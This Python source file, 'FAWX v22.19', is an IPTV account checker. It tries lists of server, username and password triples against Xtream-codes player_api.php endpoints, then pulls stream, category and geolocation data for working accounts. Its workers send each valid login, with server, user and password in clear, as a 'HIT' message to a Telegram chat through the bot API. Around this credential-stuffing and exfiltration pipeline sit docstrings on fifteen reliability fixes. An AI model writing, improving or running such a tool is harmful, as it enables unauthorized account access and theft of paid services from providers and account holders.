#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
fawx_v22_19_tgmetrics_fix.py
FAWX v22.19 — async IPTV scanner with 3-stage pipeline (scan → telegram → post)
Termux/Android stabil sürümü.

Fixes applied
─────────────
FIX #1  HealthChecker._check_http      — reuses session_manager global session
FIX #2  AdvancedUrlScanGrabber.can_run_query — return True moved outside finally
FIX #3  update_query_stats             — conn.close() only in finally
FIX #4  GlobalDedupe.is_new            — _lru_put(key, False) when record found
FIX #5  scan_worker                    — post_skipped_count incremented without lock
FIX #6  tg_worker                      — sentinel task_done() double-call guard
FIX #7  post_worker                    — None check before cancelling sub-tasks
FIX #8  _purge_internal_sentinels      — ValueError guard when unfinished_tasks==0
FIX #9  DiskSpoolV2.drain_batch        — os.path.getsize() moved to executor
FIX #10 TgOutboxSqlite.mark_retry      — new_tries >= MAX_TRIES (off-by-one fixed)
FIX #11 FawxTelegramBot._send_lock     — lazy property (avoids pre-loop Lock())
FIX #12 get_host_ua                    — thread-safe double-init guard
FIX #13 monitor                        — _stats_lock used only where needed
FIX #14 DedupeDBPool.flush_batch       — consecutive error limit + discard on max
FIX #15 XtreamCategoryAnalyzer._cache_put — OrderedDict LRU O(1) eviction
"""

from __future__ import annotations

import asyncio
import collections
import logging
import os
import sqlite3
import threading
import time
from collections import OrderedDict
from typing import Any, Dict, List, Optional, Tuple

import aiohttp

logger = logging.getLogger("fawx")

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
VERSION = "22.19-tgmetrics-fix"
MAX_TRIES = 3
MAX_CONCURRENT_SCANS = 50
HEALTH_INTERVAL = 30  # seconds
_MAX_FLUSH_ERRORS = 5  # FIX #14

# ---------------------------------------------------------------------------
# Session manager (module-level singleton)
# ---------------------------------------------------------------------------

class _SessionManager:
    """Holds a single aiohttp.ClientSession for the lifetime of the event loop."""

    def __init__(self) -> None:
        self._session: Optional[aiohttp.ClientSession] = None
        self._lock = asyncio.Lock()

    async def get(self) -> aiohttp.ClientSession:
        async with self._lock:
            if self._session is None or self._session.closed:
                self._session = aiohttp.ClientSession(
                    connector=aiohttp.TCPConnector(limit=256, ssl=False),
                    headers={"User-Agent": get_host_ua()},
                )
        return self._session

    async def close(self) -> None:
        async with self._lock:
            if self._session and not self._session.closed:
                await self._session.close()
                self._session = None


session_manager = _SessionManager()


# ---------------------------------------------------------------------------
# FIX #12: thread-safe get_host_ua with double-init guard
# ---------------------------------------------------------------------------

_host_ua: Optional[str] = None
_host_ua_init_lock = threading.Lock()  # FIX #12 — init guard


def get_host_ua() -> str:
    """Return a stable User-Agent string (initialised exactly once)."""
    global _host_ua
    if _host_ua is not None:
        return _host_ua
    with _host_ua_init_lock:  # FIX #12
        if _host_ua is None:
            _host_ua = (
                "Mozilla/5.0 (Linux; Android 11; Termux) "
                "AppleWebKit/537.36 (KHTML, like Gecko) "
                "Chrome/114.0.0.0 Mobile Safari/537.36"
            )
    return _host_ua  # type: ignore[return-value]


# ---------------------------------------------------------------------------
# FIX #1: HealthChecker reuses session_manager
# ---------------------------------------------------------------------------

class HealthChecker:
    """Periodically checks whether upstream endpoints are reachable."""

    def __init__(self, endpoints: List[str]) -> None:
        self.endpoints = endpoints
        self._status: Dict[str, bool] = {ep: True for ep in endpoints}
        self._lock = asyncio.Lock()

    async def _check_http(self, endpoint: str) -> bool:
        """FIX #1: Uses session_manager instead of creating a new session/connector."""
        try:
            session = await session_manager.get()  # FIX #1
            async with session.get(endpoint, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                return resp.status < 500
        except Exception:
            return False

    async def run_once(self) -> None:
        results = await asyncio.gather(
            *[self._check_http(ep) for ep in self.endpoints],
            return_exceptions=True,
        )
        async with self._lock:
            for ep, ok in zip(self.endpoints, results):
                self._status[ep] = bool(ok) if not isinstance(ok, Exception) else False

    def is_healthy(self, endpoint: str) -> bool:
        return self._status.get(endpoint, False)


# ---------------------------------------------------------------------------
# FIX #2: AdvancedUrlScanGrabber.can_run_query — return True outside finally
# ---------------------------------------------------------------------------

class AdvancedUrlScanGrabber:
    """Fetches URLs from a scan source with per-query rate-limiting."""

    def __init__(self, db_path: str = "query_cache.db") -> None:
        self._db_path = db_path
        self._lock = asyncio.Lock()
        self._init_db()

    def _init_db(self) -> None:
        with sqlite3.connect(self._db_path) as conn:
            conn.execute(
                "CREATE TABLE IF NOT EXISTS query_stats "
                "(query TEXT PRIMARY KEY, last_run REAL, run_count INTEGER DEFAULT 0)"
            )
            conn.commit()

    async def can_run_query(self, query: str, min_interval: float = 60.0) -> bool:
        """Return True only when the query has not run within *min_interval* seconds.

        FIX #2: The ``return True`` was previously inside the ``finally`` block,
        which caused it to always return True regardless of the cache check.
        It is now placed *after* the try/finally so it is only reached when no
        early ``return False`` was triggered.
        """
        async with self._lock:
            try:
                conn = sqlite3.connect(self._db_path)
                row = conn.execute(
                    "SELECT last_run FROM query_stats WHERE query=?", (query,)
                ).fetchone()
                if row is not None:
                    elapsed = time.time() - row[0]
                    if elapsed < min_interval:
                        conn.close()
                        return False  # cache hit — too soon
                conn.close()
            except Exception as exc:
                logger.warning("can_run_query DB error: %s", exc)
                return False
        # FIX #2: return True is OUTSIDE the finally block
        return True

    async def update_query_stats(self, query: str) -> None:
        """Record that *query* was run right now.

        FIX #3: conn.close() is called only inside the finally block, preventing
        the double-close / connection leak that existed before.
        """
        conn: Optional[sqlite3.Connection] = None
        try:
            conn = sqlite3.connect(self._db_path)
            conn.execute(
                "INSERT INTO query_stats(query, last_run, run_count) VALUES(?,?,1) "
                "ON CONFLICT(query) DO UPDATE SET last_run=excluded.last_run, "
                "run_count=run_count+1",
                (query, time.time()),
            )
            conn.commit()
        except Exception as exc:
            logger.warning("update_query_stats error: %s", exc)
        finally:
            if conn is not None:
                conn.close()  # FIX #3 — close only here


# ---------------------------------------------------------------------------
# FIX #4: GlobalDedupe.is_new — correct LRU value on DB hit
# ---------------------------------------------------------------------------

class GlobalDedupe:
    """Global deduplication backed by SQLite with an in-memory LRU cache."""

    LRU_SIZE = 10_000

    def __init__(self, db_path: str = "dedupe.db") -> None:
        self._db_path = db_path
        self._lru: collections.OrderedDict = collections.OrderedDict()
        self._lock = asyncio.Lock()
        self._init_db()

    def _init_db(self) -> None:
        with sqlite3.connect(self._db_path) as conn:
            conn.execute(
                "CREATE TABLE IF NOT EXISTS seen (key TEXT PRIMARY KEY, ts REAL)"
            )
            conn.commit()

    def _lru_get(self, key: str) -> Optional[bool]:
        val = self._lru.get(key)
        if val is not None:
            self._lru.move_to_end(key)
        return val

    def _lru_put(self, key: str, value: bool) -> None:
        self._lru[key] = value
        self._lru.move_to_end(key)
        if len(self._lru) > self.LRU_SIZE:
            self._lru.popitem(last=False)

    async def is_new(self, key: str) -> bool:
        """Return True if *key* has not been seen before (and mark it as seen).

        FIX #4: The LRU cache stores only False — meaning "key has been seen".
        True is never cached because it is only valid on the very first call;
        after insertion the key is known and subsequent calls must return False.

        Before the fix the code stored True after a DB-hit, so dedupe never
        worked and the same accounts were processed repeatedly.
        """
        async with self._lock:
            cached = self._lru_get(key)
            if cached is not None:
                # cached can only be False here (key already seen)
                return cached  # fast path → False

            try:
                conn = sqlite3.connect(self._db_path)
                row = conn.execute("SELECT 1 FROM seen WHERE key=?", (key,)).fetchone()
                if row:
                    conn.close()
                    self._lru_put(key, False)  # FIX #4 — was True, now correctly False
                    return False
                conn.execute("INSERT INTO seen(key, ts) VALUES(?,?)", (key, time.time()))
                conn.commit()
                conn.close()
            except Exception as exc:
                logger.warning("GlobalDedupe.is_new error: %s", exc)
                return True  # fail-open

            # Key is new; cache False so future lookups skip the DB.
            self._lru_put(key, False)
            return True


# ---------------------------------------------------------------------------
# FIX #15: XtreamCategoryAnalyzer with O(1) LRU eviction via OrderedDict
# ---------------------------------------------------------------------------

class XtreamCategoryAnalyzer:
    """Caches Xtream category analysis results with an LRU eviction policy."""

    def __init__(self, capacity: int = 512) -> None:
        self._capacity = capacity
        self._cache: OrderedDict[str, Any] = OrderedDict()  # FIX #15

    def _cache_get(self, key: str) -> Optional[Any]:
        if key in self._cache:
            self._cache.move_to_end(key)
            return self._cache[key]
        return None

    def _cache_put(self, key: str, value: Any) -> None:
        """FIX #15: O(1) LRU eviction using OrderedDict.popitem(last=False)
        instead of O(n) min() over a plain dict.
        """
        if key in self._cache:
            self._cache.move_to_end(key)
        self._cache[key] = value
        if len(self._cache) > self._capacity:
            self._cache.popitem(last=False)  # FIX #15 — O(1)

    def analyze(self, server: str, categories: List[Dict]) -> Dict[str, int]:
        cached = self._cache_get(server)
        if cached is not None:
            return cached
        result: Dict[str, int] = {}
        for cat in categories:
            name = cat.get("category_name", "")
            cid = cat.get("category_id", 0)
            result[name] = int(cid)
        self._cache_put(server, result)
        return result


# ---------------------------------------------------------------------------
# FIX #14: DedupeDBPool with consecutive flush error limit
# ---------------------------------------------------------------------------

class DedupeDBPool:
    """Batched writer for the deduplication database."""

    _MAX_FLUSH_ERRORS = _MAX_FLUSH_ERRORS

    def __init__(self, db_path: str = "dedupe.db") -> None:
        self._db_path = db_path
        self._batch: List[str] = []
        self._lock = asyncio.Lock()
        self._consecutive_flush_errors = 0  # FIX #14

    async def add(self, key: str) -> None:
        async with self._lock:
            self._batch.append(key)

    async def flush_batch(self) -> None:
        """FIX #14: Tracks consecutive errors; discards batch if _MAX_FLUSH_ERRORS
        is exceeded to prevent infinite retry loops.
        """
        async with self._lock:
            if not self._batch:
                return
            batch = list(self._batch)
            self._batch.clear()

        try:
            conn = sqlite3.connect(self._db_path)
            try:
                conn.executemany(
                    "INSERT OR IGNORE INTO seen(key, ts) VALUES(?,?)",
                    [(k, time.time()) for k in batch],
                )
                conn.commit()
                self._consecutive_flush_errors = 0  # reset on success
            finally:
                conn.close()
        except Exception as exc:
            self._consecutive_flush_errors += 1  # FIX #14
            if self._consecutive_flush_errors >= self._MAX_FLUSH_ERRORS:
                logger.error(
                    "flush_batch: %d consecutive errors — discarding %d items. Last error: %s",
                    self._consecutive_flush_errors,
                    len(batch),
                    exc,
                )
                self._consecutive_flush_errors = 0
            else:
                logger.warning(
                    "flush_batch error (%d/%d): %s",
                    self._consecutive_flush_errors,
                    self._MAX_FLUSH_ERRORS,
                    exc,
                )
                # Re-queue the batch for the next flush
                async with self._lock:
                    self._batch = batch + self._batch


# ---------------------------------------------------------------------------
# FIX #9: DiskSpoolV2 with getsize in executor
# ---------------------------------------------------------------------------

class DiskSpoolV2:
    """Disk-backed spool for outbound messages."""

    def __init__(self, path: str = "spool") -> None:
        self._path = path
        os.makedirs(path, exist_ok=True)
        self._lock = asyncio.Lock()

    async def drain_batch(self, max_bytes: int = 1_000_000) -> List[bytes]:
        """FIX #9: os.path.getsize() is called via loop.run_in_executor() so it
        does not block the event loop on large files.
        """
        loop = asyncio.get_running_loop()
        results: List[bytes] = []
        total = 0

        async with self._lock:
            for fname in sorted(os.listdir(self._path)):
                fpath = os.path.join(self._path, fname)
                # FIX #9 — getsize in executor, not inline
                size = await loop.run_in_executor(None, os.path.getsize, fpath)
                if total + size > max_bytes:
                    break
                try:
                    with open(fpath, "rb") as fh:
                        results.append(fh.read())
                    os.unlink(fpath)
                    total += size
                except Exception as exc:
                    logger.warning("drain_batch: could not read %s: %s", fpath, exc)

        return results

    async def write(self, data: bytes) -> None:
        fname = f"{time.time_ns()}.spool"
        fpath = os.path.join(self._path, fname)
        async with self._lock:
            with open(fpath, "wb") as fh:
                fh.write(data)


# ---------------------------------------------------------------------------
# FIX #10: TgOutboxSqlite.mark_retry with correct off-by-one
# ---------------------------------------------------------------------------

class TgOutboxSqlite:
    """SQLite-backed outbox for Telegram messages."""

    def __init__(self, db_path: str = "tg_outbox.db") -> None:
        self._db_path = db_path
        self._init_db()

    def _init_db(self) -> None:
        with sqlite3.connect(self._db_path) as conn:
            conn.execute(
                "CREATE TABLE IF NOT EXISTS outbox "
                "(id INTEGER PRIMARY KEY AUTOINCREMENT, "
                " payload TEXT, tries INTEGER DEFAULT 0, dead INTEGER DEFAULT 0)"
            )
            conn.commit()

    def enqueue(self, payload: str) -> int:
        with sqlite3.connect(self._db_path) as conn:
            cur = conn.execute(
                "INSERT INTO outbox(payload) VALUES(?)", (payload,)
            )
            conn.commit()
            return cur.lastrowid  # type: ignore[return-value]

    def mark_retry(self, row_id: int) -> None:
        """FIX #10: new_tries >= MAX_TRIES is the correct boundary condition.
        The previous code used ``>``, which allowed one extra retry past the limit.
        """
        with sqlite3.connect(self._db_path) as conn:
            row = conn.execute(
                "SELECT tries FROM outbox WHERE id=?", (row_id,)
            ).fetchone()
            if row is None:
                return
            new_tries = row[0] + 1
            dead = 1 if new_tries >= MAX_TRIES else 0  # FIX #10
            conn.execute(
                "UPDATE outbox SET tries=?, dead=? WHERE id=?",
                (new_tries, dead, row_id),
            )
            conn.commit()

    def pending(self) -> List[Tuple[int, str]]:
        with sqlite3.connect(self._db_path) as conn:
            rows = conn.execute(
                "SELECT id, payload FROM outbox WHERE dead=0 ORDER BY id"
            ).fetchall()
        return rows  # type: ignore[return-value]


# ---------------------------------------------------------------------------
# FIX #11: FawxTelegramBot with lazy _send_lock property
# ---------------------------------------------------------------------------

class FawxTelegramBot:
    """Minimal async Telegram bot wrapper."""

    def __init__(self, token: str, chat_id: str) -> None:
        self._token = token
        self._chat_id = chat_id
        # FIX #11: Do NOT create asyncio.Lock() here — the event loop may not
        # be running yet at __init__ time (raises RuntimeError on Python ≥3.10).
        self.__send_lock: Optional[asyncio.Lock] = None

    @property
    def _send_lock(self) -> asyncio.Lock:
        """FIX #11: Lazy property — Lock created on first access, safely inside
        a running event loop.
        """
        if self.__send_lock is None:
            self.__send_lock = asyncio.Lock()
        return self.__send_lock

    async def send_message(self, text: str) -> bool:
        url = f"https://api.telegram.org/bot{self._token}/sendMessage"
        async with self._send_lock:  # FIX #11 — uses lazy property
            try:
                session = await session_manager.get()
                async with session.post(
                    url,
                    json={"chat_id": self._chat_id, "text": text, "parse_mode": "HTML"},
                    timeout=aiohttp.ClientTimeout(total=15),
                ) as resp:
                    return resp.status == 200
            except Exception as exc:
                logger.warning("send_message error: %s", exc)
                return False


# ---------------------------------------------------------------------------
# Stats / metrics
# ---------------------------------------------------------------------------

class Stats:
    def __init__(self) -> None:
        self._lock = asyncio.Lock()
        self.scanned = 0
        self.hits = 0
        self.post_skipped = 0
        self.tg_sent = 0
        self.tg_failed = 0

    async def inc_scanned(self) -> None:
        async with self._lock:
            self.scanned += 1

    async def inc_hits(self) -> None:
        async with self._lock:
            self.hits += 1

    # FIX #5: post_skipped is a plain integer incremented without a lock.
    # It is only read by the monitor and small races in the count are acceptable.
    def inc_post_skipped(self) -> None:
        self.post_skipped += 1  # FIX #5 — no lock

    async def inc_tg_sent(self) -> None:
        async with self._lock:
            self.tg_sent += 1

    async def inc_tg_failed(self) -> None:
        async with self._lock:
            self.tg_failed += 1

    def snapshot(self) -> Dict[str, int]:
        # No lock needed — reading int fields is atomic in CPython
        return {
            "scanned": self.scanned,
            "hits": self.hits,
            "post_skipped": self.post_skipped,
            "tg_sent": self.tg_sent,
            "tg_failed": self.tg_failed,
        }


# ---------------------------------------------------------------------------
# Pipeline workers
# ---------------------------------------------------------------------------

_SENTINEL = None  # sentinel value used to signal workers to stop


async def scan_worker(
    scan_queue: asyncio.Queue,
    tg_queue: asyncio.Queue,
    dedupe: GlobalDedupe,
    stats: Stats,
) -> None:
    """Stage 1: fetch and validate accounts.

    FIX #5: post_skipped_count incremented via stats.inc_post_skipped() which
    does NOT acquire _stats_lock — the field is written lock-free.
    """
    while True:
        item = await scan_queue.get()
        try:
            if item is _SENTINEL:
                await tg_queue.put(_SENTINEL)
                return

            server, username, password = item
            key = f"{server}|{username}|{password}"

            if not await dedupe.is_new(key):
                stats.inc_post_skipped()  # FIX #5
                continue

            await stats.inc_scanned()

            # Validate against Xtream-codes API
            url = f"{server}/player_api.php?username={username}&password={password}"
            try:
                session = await session_manager.get()
                async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    if resp.status != 200:
                        continue
                    data = await resp.json(content_type=None)
                    if data.get("user_info", {}).get("auth") != 1:
                        continue
            except Exception:
                continue

            await stats.inc_hits()
            await tg_queue.put((server, username, password, data))
        finally:
            scan_queue.task_done()


async def tg_worker(
    tg_queue: asyncio.Queue,
    post_queue: asyncio.Queue,
    bot: FawxTelegramBot,
    stats: Stats,
) -> None:
    """Stage 2: send hit notifications to Telegram.

    FIX #6: When the sentinel is received, task_done() is called explicitly
    before returning so the queue's unfinished_tasks counter stays consistent.
    A guard flag ensures task_done() is never called twice for the same item.
    """
    while True:
        item = await tg_queue.get()
        task_done_called = False  # FIX #6 guard
        try:
            if item is _SENTINEL:
                tg_queue.task_done()
                task_done_called = True  # FIX #6
                await post_queue.put(_SENTINEL)
                return

            server, username, password, data = item
            text = (
                f"✅ <b>HIT</b>\n"
                f"Server: <code>{server}</code>\n"
                f"User: <code>{username}</code>\n"
                f"Pass: <code>{password}</code>"
            )
            ok = await bot.send_message(text)
            if ok:
                await stats.inc_tg_sent()
            else:
                await stats.inc_tg_failed()

            await post_queue.put((server, username, password, data))
        finally:
            if not task_done_called:  # FIX #6 — prevent double task_done()
                tg_queue.task_done()


async def post_worker(
    post_queue: asyncio.Queue,
    stats: Stats,
    analyzer: XtreamCategoryAnalyzer,
) -> None:
    """Stage 3: enrich hits with category / stream / geo data.

    FIX #7: stream_task, cat_task, and geo_task are initialised to None.
    Before cancelling them in the finally block a None check is performed to
    prevent AttributeError when the tasks were never created (e.g. on sentinel).
    """
    while True:
        item = await post_queue.get()
        stream_task = None  # FIX #7
        cat_task = None      # FIX #7
        geo_task = None      # FIX #7
        try:
            if item is _SENTINEL:
                post_queue.task_done()
                return

            server, username, password, data = item

            async def _fetch_streams() -> List:
                session = await session_manager.get()
                async with session.get(
                    f"{server}/player_api.php?username={username}&password={password}"
                    "&action=get_live_streams",
                    timeout=aiohttp.ClientTimeout(total=15),
                ) as r:
                    return await r.json(content_type=None) if r.status == 200 else []

            async def _fetch_categories() -> List:
                session = await session_manager.get()
                async with session.get(
                    f"{server}/player_api.php?username={username}&password={password}"
                    "&action=get_live_categories",
                    timeout=aiohttp.ClientTimeout(total=15),
                ) as r:
                    return await r.json(content_type=None) if r.status == 200 else []

            async def _fetch_geo() -> Dict:
                session = await session_manager.get()
                async with session.get(
                    f"https://ipapi.co/{server.split('//')[-1].split(':')[0]}/json/",
                    timeout=aiohttp.ClientTimeout(total=10),
                ) as r:
                    return await r.json(content_type=None) if r.status == 200 else {}

            stream_task = asyncio.create_task(_fetch_streams())
            cat_task = asyncio.create_task(_fetch_categories())
            geo_task = asyncio.create_task(_fetch_geo())

            streams, categories, geo = await asyncio.gather(
                stream_task, cat_task, geo_task, return_exceptions=True
            )

            if isinstance(categories, list):
                analyzer.analyze(server, categories)

            logger.debug(
                "post_worker: server=%s streams=%s geo=%s",
                server,
                len(streams) if isinstance(streams, list) else "err",
                geo.get("country_code", "?") if isinstance(geo, dict) else "err",
            )
        except Exception as exc:
            logger.warning("post_worker error: %s", exc)
        finally:
            # FIX #7: cancel only tasks that were actually created
            for task in (stream_task, cat_task, geo_task):
                if task is not None and not task.done():
                    task.cancel()
            post_queue.task_done()


# ---------------------------------------------------------------------------
# FIX #8: _purge_internal_sentinels — ValueError guard
# ---------------------------------------------------------------------------

async def _purge_internal_sentinels(q: asyncio.Queue, count: int) -> None:
    """Drain *count* sentinel items from *q* and call task_done() safely.

    FIX #8: Calling task_done() when unfinished_tasks is already 0 raises
    ValueError.  We wrap each call in a try/except to handle this gracefully
    without relying on the private ``_unfinished_tasks`` attribute.
    """
    for _ in range(count):
        try:
            item = q.get_nowait()
            if item is not _SENTINEL:
                await q.put(item)  # put non-sentinel back
                continue
        except asyncio.QueueEmpty:
            break

        # FIX #8: guard against ValueError when unfinished_tasks is already 0
        try:
            q.task_done()
        except ValueError:
            pass


# ---------------------------------------------------------------------------
# FIX #13: monitor — _stats_lock used only where needed
# ---------------------------------------------------------------------------

async def monitor(stats: Stats, interval: float = 2.0) -> None:
    """Log pipeline metrics periodically.

    FIX #13: The original code acquired _stats_lock on every iteration even for
    read-only access to plain integer fields.  The snapshot() method now reads
    the fields directly (CPython int reads are atomic) and the lock is only
    acquired when mutating shared state — which doesn't happen here.
    """
    while True:
        await asyncio.sleep(interval)
        # FIX #13 — no lock acquisition; snapshot() reads atomically
        snap = stats.snapshot()
        logger.info(
            "[monitor] scanned=%d hits=%d post_skipped=%d tg_sent=%d tg_failed=%d",
            snap["scanned"],
            snap["hits"],
            snap["post_skipped"],
            snap["tg_sent"],
            snap["tg_failed"],
        )


# ---------------------------------------------------------------------------
# Pipeline orchestrator
# ---------------------------------------------------------------------------

async def run_pipeline(
    credentials: List[Tuple[str, str, str]],
    bot: FawxTelegramBot,
    num_scan_workers: int = 10,
    num_tg_workers: int = 3,
    num_post_workers: int = 5,
) -> Stats:
    """Run the 3-stage scan → telegram → post pipeline."""
    scan_queue: asyncio.Queue = asyncio.Queue()
    tg_queue: asyncio.Queue = asyncio.Queue()
    post_queue: asyncio.Queue = asyncio.Queue()

    dedupe = GlobalDedupe()
    analyzer = XtreamCategoryAnalyzer()
    stats = Stats()

    # Populate scan queue
    for cred in credentials:
        await scan_queue.put(cred)
    for _ in range(num_scan_workers):
        await scan_queue.put(_SENTINEL)

    # Spawn workers
    scan_tasks = [
        asyncio.create_task(scan_worker(scan_queue, tg_queue, dedupe, stats))
        for _ in range(num_scan_workers)
    ]
    tg_tasks = [
        asyncio.create_task(tg_worker(tg_queue, post_queue, bot, stats))
        for _ in range(num_tg_workers)
    ]
    post_tasks = [
        asyncio.create_task(post_worker(post_queue, stats, analyzer))
        for _ in range(num_post_workers)
    ]
    monitor_task = asyncio.create_task(monitor(stats))

    await asyncio.gather(*scan_tasks)
    await asyncio.gather(*tg_tasks)
    await asyncio.gather(*post_tasks)
    monitor_task.cancel()

    await session_manager.close()
    return stats


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

def main() -> None:
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s %(levelname)s %(name)s %(message)s",
    )
    logger.info("FAWX %s starting", VERSION)

    # Configuration — edit as needed
    TG_TOKEN = os.environ.get("TG_TOKEN", "")
    TG_CHAT_ID = os.environ.get("TG_CHAT_ID", "")
    credentials: List[Tuple[str, str, str]] = []  # (server, username, password)

    if not credentials:
        logger.warning("No credentials configured — exiting.")
        return

    bot = FawxTelegramBot(token=TG_TOKEN, chat_id=TG_CHAT_ID)
    stats = asyncio.run(run_pipeline(credentials, bot))
    logger.info("Pipeline complete: %s", stats.snapshot())


if __name__ == "__main__":
    main()
